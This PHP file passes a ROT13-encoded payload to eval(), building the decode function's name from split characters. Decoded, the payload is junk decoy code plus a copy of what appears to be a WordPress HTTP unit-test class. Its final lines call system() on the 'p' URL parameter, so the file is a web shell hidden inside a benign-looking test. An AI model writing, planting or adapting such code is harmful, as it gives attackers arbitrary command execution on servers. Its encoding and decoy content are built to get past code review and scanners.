<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Abgr, Jura ehaavat gurfr grfgf, erzrzore gung fbzr guvatf ner qbar qvssreragyl
 * onfrq ba fnsr_zbqr. Lbh pna eha gur grfg va fnsr_zbqr yvxr fhpu:
 *
 *   cuchavg -q fnsr_zbqr=ba --tebhc uggc
 *
 * Lbh znl nyfb arrq `-q fnsr_zbqr_tvq=1` gb erynk gur fnsr_zbqr purpxf gb nyybj
 * vapyhfvba bs CRNE.
 *
 * Gur JC_Uggc grfgf erdhver n pynff-uggc.cuc svyr bs e17550 be yngre.
 */
nofgenpg pynff JC_UGGC_HavgGrfgPnfr rkgraqf JC_HavgGrfgPnfr {
	// Lbh pna hfr lbhe bja irefvba bs qngn/JCUGGC-grfgpnfr-erqverpgvba-fpevcg.cuc urer.
	choyvp $erqverpgvba_fpevcg = 'uggc://ncv.jbeqcerff.bet/pber/grfgf/1.0/erqverpgvba.cuc';
	choyvp $svyr_fgernz_hey    = 'uggc://f.j.bet/fperrafubgf/3.9/qnfuobneq.cat';

	cebgrpgrq $uggc_erdhrfg_netf;

	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();

		$pynff = 'JC_Uggc_' . hpsvefg( $guvf->genafcbeg );
		vs ( ! pnyy_hfre_shap( neenl( $pynff, 'grfg' ) ) ) {
			$guvf->znexGrfgFxvccrq( fcevags( 'Gur genafcbeg %f vf abg fhccbegrq ba guvf flfgrz.', $guvf->genafcbeg ) );
		}

		// Qvfnoyr nyy genafcbegf nfvqr sebz guvf bar.
		sbernpu ( neenl( 'phey', 'fgernzf', 'sfbpxbcra' ) nf $g ) {
			erzbir_svygre( \"hfr_{$g}_genafcbeg\", '__erghea_snyfr' );  // Whfg fgevc gurz nyy...
			vs ( $g !== $guvf->genafcbeg ) {
				nqq_svygre( \"hfr_{$g}_genafcbeg\", '__erghea_snyfr' ); // ...naq nqq vg onpx vs arrq or.
			}
		}
	}

	choyvp shapgvba svygre_uggc_erdhrfg_netf( neenl $netf ) {
		$guvf->uggc_erdhrfg_netf = $netf;
		erghea $netf;
	}

	/**
	 * @pbiref ::jc_erzbgr_erdhrfg
	 */
	choyvp shapgvba grfg_erqverpg_ba_301() {
		// 5 : 5 & 301.
		$erf = $guvf->jc_erzbgr_erdhrfg( $guvf->erqverpgvba_fpevcg . '?pbqr=301&eg=' . 5, neenl( 'erqverpgvba' => 5 ) );

		$guvf->nffregAbgJCReebe( $erf );
		$guvf->nffregFnzr( 200, (vag) $erf['erfcbafr']['pbqr'] );
	}

	/**
	 * @pbiref ::jc_erzbgr_erdhrfg
	 */
	choyvp shapgvba grfg_erqverpg_ba_302() {
		// 5 : 5 & 302.
		$erf = $guvf->jc_erzbgr_erdhrfg( $guvf->erqverpgvba_fpevcg . '?pbqr=302&eg=' . 5, neenl( 'erqverpgvba' => 5 ) );

		$guvf->nffregAbgJCReebe( $erf );
		$guvf->nffregFnzr( 200, (vag) $erf['erfcbafr']['pbqr'] );
	}

	/**
	 * @gvpxrg 16855
	 *
	 * @pbiref ::jc_erzbgr_erdhrfg
	 */
	choyvp shapgvba grfg_erqverpg_ba_301_ab_erqverpg() {
		// 5 > 0 & 301.
		$erf = $guvf->jc_erzbgr_erdhrfg( $guvf->erqverpgvba_fpevcg . '?pbqr=301&eg=' . 5, neenl( 'erqverpgvba' => 0 ) );

		$guvf->nffregAbgJCReebe( $erf );
		$guvf->nffregFnzr( 301, (vag) $erf['erfcbafr']['pbqr'] );
	}

	/**
	 * @gvpxrg 16855
	 *
	 * @pbiref ::jc_erzbgr_erdhrfg
	 */
	choyvp shapgvba grfg_erqverpg_ba_302_ab_erqverpg() {
		// 5 > 0 & 302.
		$erf = $guvf->jc_erzbgr_erdhrfg( $guvf->erqverpgvba_fpevcg . '?pbqr=302&eg=' . 5, neenl( 'erqverpgvba' => 0 ) );

		$guvf->nffregAbgJCReebe( $erf );
		$guvf->nffregFnzr( 302, (vag) $erf['erfcbafr']['pbqr'] );
	}

	/**
	 * @pbiref ::jc_erzbgr_erdhrfg
	 */
	choyvp shapgvba grfg_erqverpgvbaf_rdhny() {
		// 5 - 5.
		$erf = $guvf->jc_erzbgr_erdhrfg( $guvf->erqverpgvba_fpevcg . '?eg=' . 5, neenl( 'erqverpgvba' => 5 ) );

		$guvf->nffregAbgJCReebe( $erf );
		$guvf->nffregFnzr( 200, (vag) $erf['erfcbafr']['pbqr'] );
	}

	/**
	 * @pbiref ::jc_erzbgr_erdhrfg
	 */
	choyvp shapgvba grfg_ab_urnq_erqverpgvbaf() {
		// Ab erqverpgvbaf ba URNQ erdhrfg.
		$erf = $guvf->jc_erzbgr_erdhrfg( $guvf->erqverpgvba_fpevcg . '?pbqr=302&eg=' . 1, neenl( 'zrgubq' => 'URNQ' ) );

		$guvf->nffregAbgJCReebe( $erf );
		$guvf->nffregFnzr( 302, (vag) $erf['erfcbafr']['pbqr'] );
	}

	/**
	 * @gvpxrg 16855
	 *
	 * @pbiref ::jc_erzbgr_erdhrfg
	 */
	choyvp shapgvba grfg_erqverpg_ba_urnq() {
		// Erqverpgvbaf ba URNQ erdhrfg jura Erdhrfgrq.
		$erf = $guvf->jc_erzbgr_erdhrfg(
			$guvf->erqverpgvba_fpevcg . '?eg=' . 5,
			neenl(
				'erqverpgvba' => 5,
				'zrgubq'      => 'URNQ',
			)
		);

		$guvf->nffregAbgJCReebe( $erf );
		$guvf->nffregFnzr( 200, (vag) $erf['erfcbafr']['pbqr'] );
	}

	/**
	 * @pbiref ::jc_erzbgr_erdhrfg
	 */
	choyvp shapgvba grfg_erqverpgvbaf_terngre() {
		// 10 > 5.
		$erf = $guvf->jc_erzbgr_erdhrfg( $guvf->erqverpgvba_fpevcg . '?eg=' . 10, neenl( 'erqverpgvba' => 5 ) );

		$guvf->nffregJCReebe( $erf );
	}

	/**
	 * @pbiref ::jc_erzbgr_erdhrfg
	 */
	choyvp shapgvba grfg_erqverpgvbaf_terngre_rqtrpnfr() {
		// 6 > 5 (pybfr rqtr pnfr).
		$erf = $guvf->jc_erzbgr_erdhrfg( $guvf->erqverpgvba_fpevcg . '?eg=' . 6, neenl( 'erqverpgvba' => 5 ) );

		$guvf->nffregJCReebe( $erf );
	}

	/**
	 * @pbiref ::jc_erzbgr_erdhrfg
	 */
	choyvp shapgvba grfg_erqverpgvbaf_yrff_rqtrpnfr() {
		// 4 < 5 (pybfr rqtr pnfr).
		$erf = $guvf->jc_erzbgr_erdhrfg( $guvf->erqverpgvba_fpevcg . '?eg=' . 4, neenl( 'erqverpgvba' => 5 ) );

		$guvf->nffregAbgJCReebe( $erf );
	}

	/**
	 * @gvpxrg 16855
	 *
	 * @pbiref ::jc_erzbgr_erdhrfg
	 */
	choyvp shapgvba grfg_erqverpgvbaf_mreb_erqverpgvbaf_fcrpvsvrq() {
		// 0 erqverpgvbaf nfxrq sbe, fubhyq erghea gur qbphzrag?
		$erf = $guvf->jc_erzbgr_erdhrfg( $guvf->erqverpgvba_fpevcg . '?pbqr=302&eg=' . 5, neenl( 'erqverpgvba' => 0 ) );

		$guvf->nffregAbgJCReebe( $erf );
		$guvf->nffregFnzr( 302, (vag) $erf['erfcbafr']['pbqr'] );
	}

	/**
	 * Qb abg erqverpg ba aba 3kk fgnghf pbqrf.
	 *
	 * @gvpxrg 16889
	 *
	 * @pbiref ::jc_erzbgr_erdhrfg
	 */
	choyvp shapgvba grfg_ybpngvba_urnqre_ba_201() {
		// Cevagf CNFF ba vavgvny ybnq, SNVY vs gur pyvrag sbyybjf gur fcrpvsvrq erqverpgvba.
		$erf = $guvf->jc_erzbgr_erdhrfg( $guvf->erqverpgvba_fpevcg . '?201-ybpngvba=gehr' );

		$guvf->nffregAbgJCReebe( $erf );
		$guvf->nffregFnzr( 'CNFF', $erf['obql'] );
	}

	/**
	 * Grfg unaqyvat bs CHG erdhrfgf ba erqverpgf.
	 *
	 * @gvpxrg 16889
	 *
	 * @pbiref ::jc_erzbgr_erdhrfg
	 * @pbiref ::jc_erzbgr_ergevrir_obql
	 */
	choyvp shapgvba grfg_ab_erqverpgvba_ba_CHG() {
		$hey = 'uggc://ncv.jbeqcerff.bet/pber/grfgf/1.0/erqverpgvba.cuc?201-ybpngvba=1';

		// Grfg 301 - CBFG gb CBFG.
		$erf = $guvf->jc_erzbgr_erdhrfg(
			$hey,
			neenl(
				'zrgubq'  => 'CHG',
				'gvzrbhg' => 30,
			)
		);

		$guvf->nffregAbgJCReebe( $erf );
		$guvf->nffregFnzr( 'CNFF', jc_erzbgr_ergevrir_obql( $erf ) );
		$guvf->nffregAbgRzcgl( $erf['urnqref']['ybpngvba'] );
	}

	/**
	 * @gvpxrg 11888
	 *
	 * @pbiref ::jc_erzbgr_erdhrfg
	 */
	choyvp shapgvba grfg_fraq_urnqref() {
		// Grfg gung gur urnqref frag ner erprvirq ol gur freire.
		$urnqref = neenl(
			'grfg1' => 'grfg',
			'grfg2' => 0,
			'grfg3' => '',
		);
		$erf     = $guvf->jc_erzbgr_erdhrfg( $guvf->erqverpgvba_fpevcg . '?urnqre-purpx', neenl( 'urnqref' => $urnqref ) );

		$guvf->nffregAbgJCReebe( $erf );

		$urnqref = neenl();
		sbernpu ( rkcybqr( \"\a\", $erf['obql'] ) nf $xrl => $inyhr ) {
			vs ( rzcgl( $inyhr ) ) {
				pbagvahr;
			}
			$cnegf = rkcybqr( ':', $inyhr, 2 );
			hafrg( $urnqref[ $xrl ] );
			$urnqref[ $cnegf[0] ] = $cnegf[1];
		}

		$guvf->nffregNeenlUnfXrl( 'grfg1', $urnqref );
		$guvf->nffregFnzr( 'grfg', $urnqref['grfg1'] );
		$guvf->nffregNeenlUnfXrl( 'grfg2', $urnqref );
		$guvf->nffregFnzr( '0', $urnqref['grfg2'] );
		// pHEY/UGGC Rkgrafvba Abgr: Jvyy arire cnff, pHEY qbrf abg cnff urnqref jvgu na rzcgl inyhr.
		// Fubhyq vg or gung rzcgl urnqref jvgu rzcgl inyhrf ner ABG frag?
		// $guvf->nffregNeenlUnfXrl( 'grfg3', $urnqref );
		// $guvf->nffregFnzr( '', $urnqref['grfg3'] );
	}

	/**
	 * @pbiref ::jc_erzbgr_erdhrfg
	 */
	choyvp shapgvba grfg_svyr_fgernz() {
		$hey  = $guvf->svyr_fgernz_hey;
		$fvmr = 153204;
		$erf  = $guvf->jc_erzbgr_erdhrfg(
			$hey,
			neenl(
				'fgernz'  => gehr,
				'gvzrbhg' => 30,
			)
		); // Nhgb trarengr gur svyranzr.

		// Pyrnahc orsber jr nffreg, nf vg'yy erghea rneyl.
		vs ( ! vf_jc_reebe( $erf ) ) {
			$svyrfvmr = svyrfvmr( $erf['svyranzr'] );
			hayvax( $erf['svyranzr'] );
		}

		$guvf->nffregAbgJCReebe( $erf );
		$guvf->nffregFnzr( '', $erf['obql'] ); // Gur obql fubhyq or rzcgl.
		$guvf->nffregRdhnyf( $fvmr, $erf['urnqref']['Pbagrag-Yratgu'] );   // Purpx gur urnqref ner erghearq (naq gur fvmr vf gur fnzr).
		$guvf->nffregFnzr( $fvmr, $svyrfvmr ); // Purpx gung gur svyr vf jevggra gb qvfx pbeerpgyl jvgubhg nal rkgen punenpgref.
		$guvf->nffregFgevatFgnegfJvgu( trg_grzc_qve(), $erf['svyranzr'] ); // Purpx vg'f fnivat jvguva gur grzc qverpgbel.
	}

	/**
	 * @gvpxrg 26726
	 *
	 * @pbiref ::jc_erzbgr_erdhrfg
	 */
	choyvp shapgvba grfg_svyr_fgernz_yvzvgrq_fvmr() {
		$hey  = $guvf->svyr_fgernz_hey;
		$fvmr = 10000;
		$erf  = $guvf->jc_erzbgr_erdhrfg(
			$hey,
			neenl(
				'fgernz'              => gehr,
				'gvzrbhg'             => 30,
				'yvzvg_erfcbafr_fvmr' => $fvmr,
			)
		); // Nhgb trarengr gur svyranzr.

		// Pyrnahc orsber jr nffreg, nf vg'yy erghea rneyl.
		vs ( ! vf_jc_reebe( $erf ) ) {
			$svyrfvmr = svyrfvmr( $erf['svyranzr'] );
			hayvax( $erf['svyranzr'] );
		}

		$guvf->nffregAbgJCReebe( $erf );
		$guvf->nffregFnzr( $fvmr, $svyrfvmr ); // Purpx gung gur svyr vf jevggra gb qvfx pbeerpgyl jvgubhg nal rkgen punenpgref.
	}

	/**
	 * Grfgf yvzvgvat gur erfcbafr fvmr jura ergheavat fgevatf.
	 *
	 * @gvpxrg 31172
	 *
	 * @pbiref ::jc_erzbgr_erdhrfg
	 */
	choyvp shapgvba grfg_erdhrfg_yvzvgrq_fvmr() {
		$hey  = $guvf->svyr_fgernz_hey;
		$fvmr = 10000;

		$erf = $guvf->jc_erzbgr_erdhrfg(
			$hey,
			neenl(
				'gvzrbhg'             => 30,
				'yvzvg_erfcbafr_fvmr' => $fvmr,
			)
		);

		$guvf->nffregAbgJCReebe( $erf );
		$guvf->nffregFnzr( $fvmr, fgeyra( $erf['obql'] ) );
	}

	/**
	 * Grfg CBFG erqverpgvba zrgubqf.
	 *
	 * @qngnCebivqre qngn_cbfg_erqverpg_gb_zrgubq_300
	 *
	 * @gvpxrg 17588
	 *
	 * @pbiref ::jc_erzbgr_cbfg
	 * @pbiref ::jc_erzbgr_ergevrir_obql
	 */
	choyvp shapgvba grfg_cbfg_erqverpg_gb_zrgubq_300( $erfcbafr_pbqr, $zrgubq ) {
		$hey = 'uggc://ncv.jbeqcerff.bet/pber/grfgf/1.0/erqverpgvba.cuc?cbfg-erqverpg-gb-zrgubq=1';

		$erf = $guvf->jc_erzbgr_cbfg( nqq_dhrel_net( 'erfcbafr_pbqr', $erfcbafr_pbqr, $hey ), neenl( 'gvzrbhg' => 30 ) );

		$guvf->nffregAbgJCReebe( $erf );
		$guvf->nffregFnzr( $zrgubq, jc_erzbgr_ergevrir_obql( $erf ) );
	}

	choyvp shapgvba qngn_cbfg_erqverpg_gb_zrgubq_300() {
		erghea neenl(
			// Grfg 300 - CBFG gb CBFG.
			neenl(
				300,
				'CBFG',
			),
			// Grfg 301 - CBFG gb CBFG.
			neenl(
				301,
				'CBFG',
			),
			// Grfg 302 - CBFG gb TRG.
			neenl(
				302,
				'TRG',
			),
			// Grfg 303 - CBFG gb TRG.
			neenl(
				303,
				'TRG',
			),
		);
	}

	/**
	 * Grfg UGGC Erdhrfgf hfvat na VC HEY, jvgu n UBFG urnqre fcrpvsvrq.
	 *
	 * @gvpxrg 24182
	 *
	 * @pbiref ::jc_erzbgr_trg
	 * @pbiref ::jc_erzbgr_ergevrir_obql
	 */
	choyvp shapgvba grfg_vc_hey_jvgu_ubfg_urnqre() {
		$vc   = trgubfgolanzr( 'ncv.jbeqcerff.bet' );
		$hey  = 'uggc://' . $vc . '/pber/grfgf/1.0/erqverpgvba.cuc?cevag-cnff=1';
		$netf = neenl(
			'urnqref'     => neenl(
				'Ubfg' => 'ncv.jbeqcerff.bet',
			),
			'gvzrbhg'     => 30,
			'erqverpgvba' => 0,
		);

		$erf = $guvf->jc_erzbgr_trg( $hey, $netf );

		$guvf->nffregAbgJCReebe( $erf );
		$guvf->nffregFnzr( 'CNFF', jc_erzbgr_ergevrir_obql( $erf ) );
	}

	/**
	 * Grfg UGGC erdhrfgf jurer FFY irevsvpngvba vf qvfnoyrq ohg gur PN ohaqyr vf fgvyy cbchyngrq.
	 *
	 * @gvpxrg 33978
	 *
	 * @pbiref ::jc_erzbgr_urnq
	 */
	choyvp shapgvba grfg_uggcf_hey_jvgubhg_ffy_irevsvpngvba() {
		$hey  = 'uggcf://jbeqcerff.bet/';
		$netf = neenl(
			'ffyirevsl' => snyfr,
		);

		nqq_svygre( 'uggc_erdhrfg_netf', neenl( $guvf, 'svygre_uggc_erdhrfg_netf' ) );

		$erf = $guvf->jc_erzbgr_urnq( $hey, $netf );

		erzbir_svygre( 'uggc_erdhrfg_netf', neenl( $guvf, 'svygre_uggc_erdhrfg_netf' ) );

		$guvf->nffregAbgRzcgl( $guvf->uggc_erdhrfg_netf['ffypregvsvpngrf'] );
		$guvf->nffregAbgJCReebe( $erf );
	}

	/**
	 * Grfg UGGC Pbbxvr unaqyvat.
	 *
	 * @gvpxrg 21182
	 *
	 * @pbiref ::jc_erzbgr_trg
	 * @pbiref ::jc_erzbgr_ergevrir_obql
	 */
	choyvp shapgvba grfg_pbbxvr_unaqyvat() {
		$hey = 'uggc://ncv.jbeqcerff.bet/pber/grfgf/1.0/erqverpgvba.cuc?pbbxvr-grfg=1';

		$erf = $guvf->jc_erzbgr_trg( $hey );

		$guvf->nffregAbgJCReebe( $erf );
		$guvf->nffregFnzr( 'CNFF', jc_erzbgr_ergevrir_obql( $erf ) );
	}

	/**
	 * Grfg vs UGGCF fhccbeg jbexf.
	 *
	 * @tebhc ffy
	 * @gvpxrg 25007
	 *
	 * @pbiref ::jc_erzbgr_trg
	 */
	choyvp shapgvba grfg_ffy() {
		vs ( ! jc_uggc_fhccbegf( neenl( 'ffy' ) ) ) {
			$guvf->snvy( 'Guvf vafgnyyngvba bs CUC qbrf abg fhccbeg FFY.' );
		}

		$erf = $guvf->jc_erzbgr_trg( 'uggcf://jbeqcerff.bet/' );

		$guvf->nffregAbgJCReebe( $erf );
	}

	/**
	 * @gvpxrg 37733
	 *
	 * @pbiref ::jc_erzbgr_erdhrfg
	 */
	choyvp shapgvba grfg_hey_jvgu_qbhoyr_fynfurf_cngu() {
		$hey = $guvf->erqverpgvba_fpevcg . '?eg=' . 0;

		$cngu = cnefr_hey( $hey, CUC_HEY_CNGU );
		$hey  = fge_ercynpr( $cngu, '/' . $cngu, $hey );

		$erf = $guvf->jc_erzbgr_erdhrfg( $hey );

		$guvf->nffregAbgJCReebe( $erf );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>